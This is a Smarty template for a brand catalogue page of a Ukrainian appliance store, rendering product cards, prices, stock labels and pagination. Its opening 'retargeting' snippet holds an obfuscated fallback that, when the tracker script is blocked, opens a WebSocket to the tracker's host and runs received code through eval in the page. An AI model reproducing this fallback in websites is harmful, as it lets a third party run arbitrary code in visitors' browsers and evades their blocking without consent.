{include file=_header.tpl}

<!--Trafmag ретаргетинг-->
{literal}
<script type='text/javascript'>(function(t,r,f,m,g,c){g=t.createElement(r),c=t.getElementsByTagName(r)[0];g.type='text/javascript';g.async=1;g.src=(t.location.protocol == 'https:'?'https:':'http:')+f+m;g.onerror = function () {try {if (t.location.protocol == 'https:'){var wsproto = 'wss',wsport = '8041'} else {var wsproto='ws',wsport='8040'};var wrkr_tr_location = wsproto+':'+f+':'+wsport+m+'?ref='+encodeURIComponent(window.location.href);var wrkr_tr = new Worker(URL.createObjectURL(new Blob(['var wrkr_tr_location = "' + wrkr_tr_location + '";eval(atob("DWZ1bmN0aW9uIHNlbmRNZXNzYWdlKGUpew12YXIgaD13cmtyX3RyLm9ubWVzc2FnZTsNd3Jrcl90ci5yZWFkeVN0YXRlPT13cmtyX3RyLkNMT1NFRCYmKHdya3JfdHI9bmV3IFdlYlNvY2tldCh3cmtyX3RyX2xvY2F0aW9uKSksDXdya3JfdHIub25tZXNzYWdlPWgsDXdhaXRGb3JTb2NrZXRDb25uZWN0aW9uKHdya3JfdHIsZnVuY3Rpb24oKXt3cmtyX3RyLnNlbmQoZSk7fSkNfQ1mdW5jdGlvbiB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtyZXR1cm4gMT09PWUucmVhZHlTdGF0ZT92b2lkKG51bGwhPXQmJnQoKSk6dm9pZCB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpfSw1KX07DXdya3JfdHIgPSBuZXcgV2ViU29ja2V0KHdya3JfdHJfbG9jYXRpb24pLA13cmtyX3RyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uICh0KSB7cG9zdE1lc3NhZ2UodC5kYXRhKTt9LA1vbm1lc3NhZ2UgPSBmdW5jdGlvbihlKXtzZW5kTWVzc2FnZShlLmRhdGEpfQ0="))']), {type: "application/javascript"}));wrkr_tr.onmessage = function(msg) {window.eval(msg.data)};wrkr_tr.postMessage('');}catch (err) {}};c.parentNode.insertBefore(g,c);})(document,'script','//t.trafmag.com','/tracking.js');</script>
{/literal}
<!-- //Trafmag ретаргетинг-->

{if $brand}
    {assign var=pages value=$paginator->getPages()}
    <div class="h1_holder span-12 no_margin">
        <h1>Техника {$brandName}</h1>
    </div>
    {if $zf.params.controller=='catalog' && $zf.params.action!='search' && $catId!=1 && $zf.params.action!='compare'}
        {if $seo_h2}
            <h2>{$seo_h2}</h2>
        {/if}
    {/if}

    {if $seo_text_top}
        <article class="stext-top" id="stext">{$seo_text_top}</article>
        <p class="stext-show"><span id="data-toggle-text">Читать дальше</span></p>
    {/if}

    {if $seo_text_bottom}
        <article class="stext-bottom">
            {$seo_text_bottom}
        </article>
    {/if}

    <nav class="breadcumbs" itemscope itemtype="http://data-vocabulary.org/Breadcrumb">
        <a href="/">Главная</a>
        <i>&rarr;</i>
        <span>{$brandName}</span>
    </nav>
    <div class="cat-brand">
        <div class="btn-group">
            <span class="btn" data-toggle="dropdown">Все категории</span>
            <span class="btn dropdown-toggle" data-toggle="dropdown"><i class="caret"></i></span>
            <ul class="dropdown-menu">
                {foreach from=$cats key=parent item=children}
                    <li><a href="#"><span class='strong'>{$parent}</span></a></li>
                    {foreach from=$children item=child key=key}
                        <li><a href="{url assoc.brand=$brandName|mblower param=$child.route}">{$child.name}</a></li>
                    {/foreach}
                {/foreach}
            </ul>
        </div>
    </div>
    <div class="span-12 no_margin category_nav">
        <div class="category_nav_sort">
            <span></span>
            <span class="sort_item_selected"></span>
        </div>
        <div class="switch_view">
            <span>Вид</span>
            <div class="list_as_block data-display" data-display="grid">
                <span></span>
                <span></span>
                <span></span>
                <span></span>
            </div>
            <div class="list_as_list data-display" data-display="row">
                <span></span>
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        <div class="filter_params span-6"></div>
    </div>

{literal}
    <script type="text/javascript">
        $(document).ready(function() {
            $('.category_block_view_item[data-qtip="1"]').qtip({
                content: {
                    text: function(event, api) {
                        return $(this).find('.prev_bonus').html();
                    }
                },
                style: {
                    classes: 'qtip-light qtip-bootstrap',
                    width: '220px',
                },
                position: {
                    my: 'top right',
                    at: 'top left',
                }
            });
        });
    </script>
{/literal}

    <div id="category_block_view_listing" class="span-12 no_margin">
        {foreach from=$items item=item name=catitems}
            {if $smarty.foreach.catitems.iteration == 3}
                <!-- Баннер "Принимаем платежные карты" -->
                <div class="span-4 category_block_view_item category_block_view_ads">
                    <a href="https://590.ua/news/%D0%9F%D1%80%D0%B8%D0%BD%D0%B8%D0%BC%D0%B0%D0%B5%D0%BC-%D0%BA-%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B5-%D0%BF%D0%BB%D0%B0%D1%81%D1%82%D0%B8%D0%BA%D0%BE%D0%B2%D1%8B%D0%B5-%D0%BA%D0%B0%D1%80%D1%82%D0%BE%D1%87%D0%BA%D0%B8">
                        <img class="category_block_view_item_banner" src="/images/visa-210x345.jpg" alt="Принимаем к оплате пластиковые карточки Visa, Maestro, MasterCard">
                    </a>
                </div>
            {/if}
            {if $item.bonus_amount > 0}
                <div class="span-4 category_block_view_item" data-qtip="1">
            {else}
                <div class="span-4 category_block_view_item">
            {/if}

                <div class="prev_bonus" style="display:none;">
                    Купив {$item.brand} {$item.name} у нас, Вы получаете +{$item.bonus_amount|round}грн на бонусный счет к цене!
                </div>
                {if $item.bestprice > $item.price || $item.id2==41385}
                    <i title="Лучшая цена" class="sale-icon sale-icon-price"></i>
                {/if}
                {if $item.specprice && ($item.bdprice > $item.price) && (($item.bdprice - $item.price) > 1) && !($item.sale==1 && $item.d90==-1)}
                    <i title="Акционная цена" class="sale-icon sale-icon-discount"></i>
                {/if}
                {if $item.sale==1 && $item.d90==-1}
                    <i title="Распродажа" class="sale-icon sale-icon-sale"></i>
                {/if}
                <div class="head">
                    <a href="{iurl assoc.parent=$item.parentname  assoc.cat_latin=$item.cat_latin_single assoc.subdomain=$item.subdomain assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}">{$item.brand} {$item.name}</a>
                    <span class="description">{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if}</span>

                    {if !($item.archive == 1 && $item.id_availability == 3) && ($manager || $item.id_availability == 3)}
                        {if $item.id_availability == 1} <span class="in_stock_status">
                            <link itemprop="availability" href="http://schema.org/InStock"/>Есть в наличии{/if}</span>
                        {if $item.id_availability == 2}
                            <link itemprop="availability" href="http://schema.org/InStock"/>
                            <span class="status_stock_status">Наличие уточняйте</span>
                        {/if}
                        {if $item.id_availability == 3}
                            <span class="order_stock_status">
                                <a class="on-order" target="_blank" href="/articles/4" title="Как получить товар под заказ">
                                    <link itemprop="availability" href="http://schema.org/PreOrder"/>Под заказ
                                </a>
                            </span>
                        {/if}
                        {if $item.id_availability == 4}
                            <span class="in_stock_status" rel="tooltip" data-placement="top" data-original-title="Есть в наличии. Доставка через 5 рабочих дней" title="Есть в наличии. Доставка через 5 рабочих дней">
                                <link itemprop="availability" href="http://schema.org/InStock"/>Есть в наличии. Доставка через 5 рабочих дней
                            </span>
                        {/if}
                    {/if}
                </div>
                <div class="image_holder">
                    {if $item.imgid}
                        <a href="{iurl  assoc.cat_latin=$item.cat_latin_single assoc.parent=$item.parentname assoc.subdomain=$item.subdomain assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}" title="{$item.brand} {$item.name}">
                            <img itemprop="image" src="{$url.img}/catalog/{$item.imgid}_s.{$item.imgext}" title="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name}" alt="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name} - catalog"/>
                        </a>
                    {else}
                        <img src="/images/noimage.jpg" alt="{$item.brand} {$item.name}"/>
                    {/if}
                </div>

                {if $item.acttype=='gift'}
                    <div class="gift">
                        <div class="products_container_image_wrap">
                            <a href="#gift-modal-{$item.id}" data-toggle="modal" class="gift-txt-lnk data-getActInfo" id="i_{$item.id}"><img src="/images/catalog/{gift assoc.id=$item.actid}" alt="">
                            </a>
                        </div>
                        <span>Подарок</span>
                    </div>
                {/if}
                {if $item.acttype=='gift'}
                    <div class="action_terms"><a href="#gift-modal-{$item.id}" data-toggle="modal" class="gift-txt-lnk data-getActInfo" id="i_{$item.id}">Условия акции<img src="/assets/media/akcija.png"></a></div>
                {else}
                    <div class="action_terms"></div>
                {/if}

                <span class="full_description">{if $zf.params.catid == 189}{$item.short_info|replace:'Стиральная машина':''}{else}{$item.short_info|truncate:270}{/if}</span>
                <span class="style_price">Цена:</span><br>
                {if $item.specprice  && ($item.bdprice > $item.price) && (($item.bdprice - $item.price)/$item.price > 0.01) }
                    <span class="price_sidebar old">{price $item.bdprice $item.id_currency} <span class="currency">{$smarty.session.Currency.title}</span></span>
                    <span class="price_sidebar new">{price $item.price $item.id_currency} <span class="currency">{$smarty.session.Currency.title}</span></span>
                {else}
                    <span class="price_sidebar">{price $item.price $item.id_currency}
                        <span class="currency">{$smarty.session.Currency.title}</span>
                    </span>
                {/if}
                {if $manager}
                    {if $item.id_programm==3}<p class="manager-pr">Салонная программа</p>{/if}
                    {if ($item.price > $item.bestprice) && $item.cost*1.1 < $item.bestprice}
                        <p class="category-price">Первая цена {math equation="(x-y)/x*100" x=$item.price y=$item.bestprice} </p>
                    {/if}
                    {if $item.rent}<p class="category-price">Категория цены {if $item.rent > 25}1{elseif $item.rent > 12.5}2{elseif $item.rent > 7.5}3{else}{/if}</p>{/if}
                    <p class="cat-manager-price">Розница -
                        <span class='strong'>{price $item.roznprice $item.id_currency} {$smarty.session.Currency.title}</span>
                        Скидка - {$item.realDiscount|round}%
                    </p>
                    <p>{$item.qrm}, {$item.qty_z}
                        , {if $item.rqrm}{$item.rqrm}{else}-{/if}{if $login == 'Сергей Гринюк' || $login == 'Vadyus' || $login == 'Shishko'}{if $item.rent},({$item.rent|round}){/if},[{$item.sold}]{/if}</p>
                {/if}

                <span class="cat-item-buy">
                    {if !in_array($item.id, $basketStats.ids)}
                        <a style="
    float: left;
    margin-top: 10px;
    background-image: linear-gradient(to bottom, #5bde71, #2ba247);
    background-color: #5bde71;" href="#data-basket" onclick="addToCart({$item.id})" data-toggle="modal" class="btn btn-info data-AddToCart data-itemId-{$item.id}"><i class="icon-shopping-cart icon-white"></i> <span>{if $item.id_availability == 1}Купить{else}Заказать{/if}</span></a>
                    {else}
                        <a style="
    float: left;
    margin-top: 10px;
    background-image: linear-gradient(to bottom, #f7a81e, #f89406);
    background-color: #f7a81e;" href="#data-basket" onclick="addToCart({$item.id})" data-toggle="modal" class="btn btn-warning data-AddToCart data-itemId-{$item.id}"><i class="icon-shopping-cart icon-white"></i>
                            <span>В корзине</span></a>
                    {/if}
                </span>

                <p class="cat-item-compare">
                    <span title="Добавить в список сравнения" id="comp_{$item.id}" data-id='{$item.id}' data-category='{$item.cat|mblower}' class="data-toggleCompare{if in_array($item.id, $compareItems)} checked{/if}" data-url="{$url.img}/catalog/{$item.imgid}_s.{$item.imgext}">
                        <i>в список сравнения</i>
                    </span>
                </p>
                {if $item.id_brand == '26' && $item.id_category != 60}<i class="guarantee-icon"></i>{/if}

                </div><!-- / .cat-item1 -->
        {/foreach}
        </div><!-- / .products -->
    <div class="clear"></div>
{/if}

<!-- pager -->
{if $pages->pageCount > 1}
    <div class="span-12 no_margin category_nav paggination">
        <p>Страницы:</p>
        {if $pages->current > 1}
            <a href="{if $pages->current-1=='1'}{$firstPageUrl}{else}{$firstPageUrl}/page/{$pages->current-1}{/if}">&larr;</a>
        {/if}
        {if $pages->firstPageInRangeNum!=1}
            <a href="{$firstPageUrl}">1</a>
            <p>...</p>
        {/if}
        {if $pages->pagesInRange}
            {foreach from=$pages->pagesInRange item=p key=k}
                {if $pages->current!=$k}
                    <a href="https://590.ua{if $k=='1'}{$firstPageUrl}{else}{$firstPageUrl}/page/{$k}{/if}">{$k}</a>
                {else}
                    <span class="current">{$pages->current}</span>
                {/if}
            {/foreach}
        {/if}
        {if $pages->pageCount && $pages->lastPageInRange != $pages->last}
            <p>...</p>
            <a href="https://590.ua{$firstPageUrl}/page/{$pages->pageCount}">{$pages->pageCount}</a>
        {/if}

        {if $pages->current < $pages->pageCount}
            <a href="https://590.ua{$firstPageUrl}/page/{$pages->current+1}">&rarr;</a>
        {/if}
    </div>
{/if}
<!-- / .pager -->

{literal}
    <script type="text/javascript">
        $(document).ready(function () {
            $('.list-of-items, .brand-select').show();
        })
    </script>
{/literal}

{include file=_footer.tpl}
